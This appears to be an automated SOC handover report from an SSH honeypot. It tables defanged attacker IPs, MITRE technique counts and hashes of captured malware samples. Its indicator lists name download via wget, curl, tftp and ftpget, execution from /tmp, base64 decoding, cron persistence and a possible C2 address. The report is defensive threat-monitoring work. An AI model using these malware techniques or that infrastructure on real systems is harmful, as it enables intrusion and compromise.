| `49.88.156[.]34` | 1 | 2026-06-30 06:16 | 2026-06-30 06:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]182` | 1 | 2026-06-30 05:19 | 2026-06-30 05:19 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]193` | 1 | 2026-06-30 05:46 | 2026-06-30 05:46 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]197` | 1 | 2026-06-30 03:38 | 2026-06-30 03:38 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-06-30 06:17 | 2026-06-30 06:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]65` | 1 | 2026-06-30 06:49 | 2026-06-30 06:49 | 17s | 0 | `T1592` | 🟢 LOW |
| `66.240.223[.]240` | 1 | 2026-06-30 03:07 | 2026-06-30 03:07 | 10s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]201` | 1 | 2026-06-30 04:27 | 2026-06-30 04:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]207` | 1 | 2026-06-30 04:30 | 2026-06-30 04:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]253` | 1 | 2026-06-30 04:59 | 2026-06-30 04:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]165` | 1 | 2026-06-30 04:30 | 2026-06-30 04:30 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 50/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 52/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 76/100 | 🔴 HIGH | **17/75** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 52/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/75** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `938d5d3054da170715410084aef8fc7d029a4adf6e622b4245619ec0cc3bddf2` | ELF Binary (Linux executable) (MIPS 32-bit) | `938d5d3054da1707...` | 52/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `93e71b122a432c2b7acf6a5db6ee3e42e792ef240acee466c4310b052e2416db` | Shell Script | `93e71b122a432c2b...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `9646ec7df450cf35e898623f8eb1dd3fe66569730156d0bb055d04ebb5272afc` | Unknown binary | `9646ec7df450cf35...` | 55/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb` | ELF Binary (Linux executable) (x86-64 64-bit) | `97a1e6f817d44a4f...` | 42/100 | 🟡 MEDIUM | **30/73** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `b1633346a694467b99d9596fe36d0cc88ff1f82f8e86f1c53d3218de1839a43e` | Python Script | `b1633346a694467b...` | 62/100 | 🟡 MEDIUM | **7/75** 🔴 |
| `b1e4374da060cb4bf9ff872f3e060486d9cd400519e0b2823f61670d64148ab4` | ELF Binary (Linux executable) (x86-64 64-bit) | `b1e4374da060cb4b...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49` | ELF Binary (Linux executable) (x86-64 64-bit) | `b20f39fc00d242e7...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `bc917f6bbce0845d39c27ee8147a140bf5ab594f50558024f0ec925864ec69c7` | ELF Binary (Linux executable) (MIPS 32-bit) | `bc917f6bbce0845d...` | 30/100 | 🟢 LOW | Not in VT |
| `bcc130d7635ef1ef7350d3135bf3e4abb606dce75f1972636144f96b12839425` | Bash Script | `bcc130d7635ef1ef...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` | ELF Binary (Linux executable) (x86 32-bit) | `c8545034cd4fe71e...` | 85/100 | 🔴 HIGH | **39/75** 🔴 |
| `cc653189103bd14e46958bae5f37f94852b7d54ced5662bf7858801c138645a8` | ELF Binary (Linux executable) (MIPS 32-bit) | `cc653189103bd14e...` | 63/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `ce3cb467257e402122e4ab5f3f40fefcbdb4a662664659672a38967ee8aaaad0` | ELF Binary (Linux executable) (x86-64 64-bit) | `ce3cb467257e4021...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `d0f5cafd9fb6a363a8b97c84a3546f601a4ba10d49cdd7dae418288caec6940b` | ELF Binary (Linux executable) (x86 32-bit) | `d0f5cafd9fb6a363...` | 51/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `d16bffbd3ba31504aea1fc01e66e29ad5927830ea5e2cc49369e82a7c68ec5c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `d16bffbd3ba31504...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` | Bash Script | `d46555af1173d22f...` | 70/100 | 🔴 HIGH | **26/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`c8545034cd4fe71eeadb24dacddc5da95c4311c7112c299f1325801f3e06f928` (c8545034cd4fe71eeadb24da...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e` (d46555af1173d22f07c37ef9...)_
- `Execution from /tmp` — `/tmp/clean_crontab`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `192.142.52[.]45` | ES | Ultahost Inc | **100** ⚠️ | 0 |
| `193.176.31[.]228` | NL | Infrawatch Limited | **100** ⚠️ | 26 |
| `66.132.195[.]65` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `158.101.161[.]27` | DE | Oracle Public Cloud | **100** ⚠️ | 14 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `167.233.84[.]171` | DE | Hetzner Online GmbH | **100** ⚠️ | 4 |
| `204.76.203[.]221` | NL | Intelligence Hosting LLC | **100** ⚠️ | 19 |
| `45.205.1[.]42` | BR | VPSVAULT.HOST LTD | **100** ⚠️ | 8 |
| `139.99.74[.]35` | SG | OVH Singapore PTE. LTD | **100** ⚠️ | 6 |
| `223.109.141[.]9` | CN | China Mobile Communications Corporation | **100** ⚠️ | 11 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 173 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 161 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 25 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 23 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 3 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 9 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 399 cases |
| Tool 34  | Credential Extractor        | ✅ 266 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 17 fingerprints |
| Tool 36  | Command Clustering          | ✅ 7 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 86 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (3.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 53 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 40 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 161 priority case(s) shown individually · 44 recon entry/entries in table (9 group(s) consolidating 191 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-06-30T08:00:21Z_
